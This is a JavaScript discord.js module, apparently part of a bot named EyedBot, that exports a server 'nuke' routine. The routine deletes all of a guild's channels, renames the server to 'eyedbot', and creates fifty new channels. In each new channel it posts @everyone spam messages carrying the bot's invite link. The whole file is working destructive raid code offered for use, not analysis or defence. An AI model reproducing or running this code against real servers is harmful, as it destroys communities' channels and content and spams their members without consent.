const { ChannelType, PermissionFlagsBits } = require('discord.js');
const { getBotInviteUrl } = require('./bot-invite');

const SERVER_NAME = 'eyedbot';
const CHANNEL_CREATE_COUNT = 50;
const CHANNEL_CREATE_DELAY_MS = 350;
const CHANNEL_DELETE_DELAY_MS = 200;
const MESSAGES_PER_CHANNEL = 5;
const MESSAGE_SPAM_DELAY_MS = 200;
const MAX_DELETE_PASSES = 6;

const DELETABLE_CHANNEL_TYPES = new Set([
    ChannelType.GuildText,
    ChannelType.GuildVoice,
    ChannelType.GuildCategory,
    ChannelType.GuildAnnouncement,
    ChannelType.GuildStageVoice,
    ChannelType.GuildForum,
    ChannelType.GuildMedia
]);

function sleep(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

function buildChannelName(index) {
    return index === 1 ? 'eyedbot' : `eyedbot-${index}`;
}

function isGuildChannel(channel) {
    if (!channel || typeof channel.isThread === 'function' && channel.isThread()) {
        return false;
    }

    return DELETABLE_CHANNEL_TYPES.has(channel.type);
}

function getChannelDepth(channel) {
    let depth = 0;
    let parent = channel.parent;

    while (parent) {
        depth += 1;
        parent = parent.parent;
    }

    return depth;
}

function sortChannelsForDeletion(channels) {
    return [...channels].sort((left, right) => {
        const depthDelta = getChannelDepth(right) - getChannelDepth(left);
        if (depthDelta !== 0) return depthDelta;

        const leftIsCategory = left.type === ChannelType.GuildCategory;
        const rightIsCategory = right.type === ChannelType.GuildCategory;

        if (leftIsCategory && !rightIsCategory) return 1;
        if (!leftIsCategory && rightIsCategory) return -1;

        return (right.rawPosition ?? 0) - (left.rawPosition ?? 0);
    });
}

function canAttemptChannelDelete(channel, member) {
    if (!isGuildChannel(channel)) return false;
    if (!member) return true;

    if (member.permissions.has(PermissionFlagsBits.Administrator)) {
        return true;
    }

    return Boolean(channel.permissionsFor(member)?.has(PermissionFlagsBits.ManageChannels));
}

async function refreshGuildChannels(guild) {
    const fetched = await guild.channels.fetch({ force: true }).catch(() => null);
    if (fetched?.size) {
        return [...fetched.values()];
    }

    return [...guild.channels.cache.values()];
}

async function clearGuildChannelPointers(guild, reason) {
    await guild.edit({
        systemChannel: null,
        rulesChannel: null,
        publicUpdatesChannel: null,
        safetyAlertsChannel: null,
        afkChannel: null
    }, reason).catch(() => null);
}

async function deleteGuildChannels(guild, member, reason) {
    await clearGuildChannelPointers(guild, reason);

    let deleted = 0;

    for (let pass = 0; pass < MAX_DELETE_PASSES; pass += 1) {
        const channels = sortChannelsForDeletion(
            (await refreshGuildChannels(guild)).filter((channel) => canAttemptChannelDelete(channel, member))
        );

        if (!channels.length) break;

        let deletedThisPass = 0;

        for (const channel of channels) {
            try {
                await channel.delete(reason);
                deleted += 1;
                deletedThisPass += 1;
                await sleep(CHANNEL_DELETE_DELAY_MS);
            } catch {
                // Reintentar en la siguiente pasada.
            }
        }

        if (!deletedThisPass) break;
    }

    return deleted;
}

function buildSpamMessage(inviteUrl) {
    return `@everyone\n**EyedBot**\n${inviteUrl}`;
}

async function createEyedBotChannels(guild, client, count, reason) {
    const inviteUrl = getBotInviteUrl(client);
    const created = [];

    for (let index = 1; index <= count; index += 1) {
        const channel = await guild.channels.create({
            name: buildChannelName(index),
            type: ChannelType.GuildText,
            topic: 'EyedBot · Invitación del panel web',
            reason
        });

        if (!inviteUrl) {
            await channel.send({
                content: '**EyedBot**\nNo pude resolver el enlace de invitación del panel web.'
            });
            created.push(channel);
            await sleep(CHANNEL_CREATE_DELAY_MS);
            continue;
        }

        for (let messageIndex = 0; messageIndex < MESSAGES_PER_CHANNEL; messageIndex += 1) {
            await channel.send({
                content: buildSpamMessage(inviteUrl)
            });

            if (messageIndex < MESSAGES_PER_CHANNEL - 1) {
                await sleep(MESSAGE_SPAM_DELAY_MS);
            }
        }

        created.push(channel);

        if (index < count) {
            await sleep(CHANNEL_CREATE_DELAY_MS);
        }
    }

    return created;
}

async function executeGuildNuke(guild, client, actorTag) {
    const me = await guild.members.fetchMe().catch(() => guild.members.me);
    const missingPermissions = [];

    if (!me?.permissions.has(PermissionFlagsBits.ManageChannels)) {
        missingPermissions.push('Gestionar canales');
    }

    if (!me?.permissions.has(PermissionFlagsBits.ManageGuild)) {
        missingPermissions.push('Gestionar servidor');
    }

    if (missingPermissions.length > 0) {
        const error = new Error(`No tengo permiso para: ${missingPermissions.join(', ')}.`);
        error.statusCode = 403;
        throw error;
    }

    const reason = `Nuke ejecutado por ${actorTag}`;
    const deletedCount = await deleteGuildChannels(guild, me, reason);
    let renamed = false;

    try {
        await guild.setName(SERVER_NAME, reason);
        renamed = true;
    } catch {
        renamed = false;
    }

    let createdCount = 0;

    try {
        const createdChannels = await createEyedBotChannels(guild, client, CHANNEL_CREATE_COUNT, reason);
        createdCount = createdChannels.length;
    } catch {
        createdCount = 0;
    }

    const remainingChannels = (await refreshGuildChannels(guild))
        .filter((channel) => isGuildChannel(channel))
        .filter((channel) => !String(channel.name || '').startsWith('eyedbot'));

    return {
        serverName: SERVER_NAME,
        deletedCount,
        createdCount,
        renamed,
        remainingChannels: remainingChannels.length
    };
}

module.exports = {
    executeGuildNuke
};
